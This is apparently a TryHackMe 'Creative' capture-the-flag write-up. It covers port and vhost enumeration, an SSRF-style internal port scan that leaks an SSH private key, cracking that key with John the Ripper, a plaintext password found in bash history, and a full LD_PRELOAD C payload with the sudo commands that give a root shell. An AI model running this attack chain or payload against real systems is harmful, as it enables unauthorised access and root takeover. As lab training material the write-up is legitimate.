# Creative

```sh
export IP= M_ip
```
# Enumeration:
```sh
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsXwQrUw2YlhqFRnJpLvzHz5VnTqQ/Xr+IMJmnIyh82p1WwUsnFHgAELVccD6DdB1ksKH5HxD8iBoY83p3d/UfM8xlPzWGZkTAfZ+SR1b6MJEJU/JEiooZu4aPe4tiRdNQKB09stTOfaMUFsbXSYGjvf5u+gavNZOOTCQxEoKeZzPzxUJ0baz/Vx5Elihfm3MoR0nrE2XFTY6HV2cwLojeWCww3njG+P1E4salm86MAswQWxOeHLk/a0wXJ343X5NaHNuF4Xo3PpqiUr+qEZUyZJKNrH4O8hErH/2h7AUEPpPIo7zEK1ZzqFNWcpOqguYOFVZMagHS//ASg3ikzouZS1nUmS7ehA9bGrhCbqMRSin1QJ/mnwYBylW6IsPyfuJfl9KFnbTITa56URmudd999UzNEj8Wx8Qj4LfTWKLubcYS9iKN+exbAxXOIdbpolVtIFh0mP/cm9WRhf0z9WR9tX1FvJYi013rcaMpy62pjPCO20nbNsnEG6QckMk/4RM=
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOIFbjvSW+v5RoDWDKFI//sn2LxlSxk2ovUPyUzpB1g/XQLlbF1oy3To2D8N8LAWwrLForz4IJ4JrZXR5KvRK8Y=
|   256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFf4qwz85WzZVwohJm4pYByLpBj7j2JiQp4cBqmaBwYV
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Creative Studio | Free Bootstrap 4.3.x template
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Brute Force Dir:
I Did not get anything interesting  
```sh
gobuster dir -u http://creative.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt   -x php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://creative.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              ,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 37589]
/assets               (Status: 301) [Size: 178] [--> http://creative.thm/assets/]
```
# Brute Force vhost:
Found: beta.creative.thm
add this at your /etc/hosts 
```sh
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://creative.thm --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://creative.thm
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: beta.creative.thm Status: 200 [Size: 591]
```
This page provides the functionality that allows you to test a URL to see if it is alive. Enter a URL in the form below and click "Submit" to test it.

![Screenshot_33](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/816dcac4-9411-4e43-9d42-62fa0fef42fa)

# Brute Force Ports:

I used burpsuite to bruteforce suspisous ports  


![Screenshot_35](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/76366f49-3a9c-4cee-9f7e-f28af617ee0a)


<details>
  <summary><i>Susp_Ports.txt</i></summary>
  
```
666
801
1015
1025
1030
1042
1075
1080
1170
1234
1235
1241
1243
1337
1541
1900
1981
1999
2001
2222
2766
2773
2989
3000
3001
3024
3030
3128
3129
3200
3333
3410
3478
3489
4000
4041
4043
4092
4444
4051
4434
4435
4436
4437
4438
4439
4440
4441
4442
4443
4433
4567
4590
4782
5000
5001
5002
5096
5222
5321
5400
5405
5421
5500
5556
5631
5632
5650
5651
5655
5665
5721
5800
5900
5901
5902
5903
5904
5905
5906
5907
5908
5909
5910
5938
5939
5950
5985
5986
6030
6040
6129
6130
6132
6133
6568
6666
6667
6783
6784
6785
6881
6882
6883
6884
6885
6886
6887
6888
6889
6890
6891
6892
6893
6894
6895
6896
6897
6898
6899
7070
7096
7443
7444
7474
7681
7682
7687
7777
7844
8022
8040
8041
8080
8081
8200
8443
8848
8888
8999
9001
9050
9051
9090
9200
9631
9988
9999
10002
10110
10426
10666
12122
12345
12346
13333
15000
15555
16990
16991
16992
16993
17300
19999
20034
21115
21116
21802
22543
25405
27374
30662
31335
31337
31338
31785
31789
35000
48101
50001
50002
50003
50050
53531
54320
55553
57230
59074
59076
61466
65000  
```


</details>

the Content-Length: 1316 is diffrent from Content-Length of the others Ports

![Screenshot_34](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/4ad3c70d-769b-4a4b-acdf-acfc6f00052f)

in the home directory i found .ssh directory that contain id_rsa for saad user.

![Screenshot_36](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/3f0ab065-fbcb-4501-94bf-b767eb0ba966)

# Login via ssh

```sh
-rw------- 1 saad saad   362 Jan 21  2023 .bash_history =====> its own by ower  user saad

chmod 600 id_rsa

ssh2john id_rsa > hash

john   --wordlist=/opt/rockyou.txt  hash 
$Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 0.00% (ETA: 2024-05-08 17:09) 0g/s 34.78p/s 34.78c/s 34.78C/s tinkerbell..softball
password        (id_rsa)     
1g 0:00:00:30 DONE (2024-05-06 14:01) 0.03277g/s 31.46p/s 31.46c/s 31.46C/s chloe..julius
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

ssh saad@creative.thm -i id_rsa     
Enter passphrase for key 'id_rsa': password

```

```sh
saad@m4lware:~$ cat .bash_history 
whoami
pwd
ls -al
ls
cd ..
sudo -l
echo "saad:MyStrongestPasswor####" > creds.txt
rm creds.txt
saad@m4lware:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping

```
# Privilege escalation:

LD_PRELOAD is an environment variable in Unix-like systems, such as Linux, that allows you to specify additional shared libraries to be loaded before all others.
With this i could write c code script to spawn a root shell ,shell.c
I uploaded the script via python3 http.server to the Victim.
```sh
#include <stdio.h> 
#include <stdlib.h>
#include <unistd.h>

void inject()__attribute__((constructor));

void inject() {
 	unsetenv("LD_PRELOAD");
 	setgid(0);
 	setuid(0);
 	system("/bin/bash");
}
```
# compile the code:
```sh
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
and run
sudo LD_PRELOAD=/home/saad/shell.so ping
```
We got A root shell 
